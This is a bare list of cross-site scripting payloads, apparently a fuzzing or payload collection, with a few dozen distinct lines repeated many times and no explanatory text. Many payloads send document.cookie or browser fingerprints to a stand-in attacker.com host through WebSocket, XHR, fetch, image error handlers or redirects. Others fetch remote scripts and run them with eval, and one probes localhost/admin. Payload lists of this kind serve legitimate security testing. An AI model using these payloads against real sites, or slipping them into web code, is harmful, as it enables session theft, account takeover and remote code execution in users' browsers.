<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<svg onload="alert(1)"></svg>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
